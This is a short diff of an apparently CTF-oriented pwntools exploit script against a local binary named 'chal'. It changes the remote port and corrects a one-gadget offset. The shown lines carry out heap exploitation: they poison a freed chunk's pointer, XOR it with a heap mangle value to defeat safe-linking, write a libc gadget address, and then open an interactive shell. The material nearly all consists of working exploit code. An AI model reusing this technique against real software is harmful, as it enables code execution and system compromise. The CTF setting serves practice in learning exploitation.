@@ -3,7 +3,7 @@ from pwn import *
 elf = context.binary = ELF("chal")
 libc = elf.libc
 if args.REMOTE:
-	p = remote("localhost", 4444)
+	p = remote("localhost", 33123)
 else:
 	p = elf.process()
 
@@ -54,6 +54,6 @@ delete(0)
 edit(0, p64((2203672-8+libc.address)^ heap_mangle))
 gadgets = 965765
 create(0x100, b"d")
-create(0x100, cyclic(48,n=8) + p64(libc.address + 1705728) + cyclic(0x50, n=8) + p64(libc.address + gadgets[1]))
+create(0x100, cyclic(48,n=8) + p64(libc.address + 1705728) + cyclic(0x50, n=8) + p64(libc.address + gadgets))
 
 p.interactive()
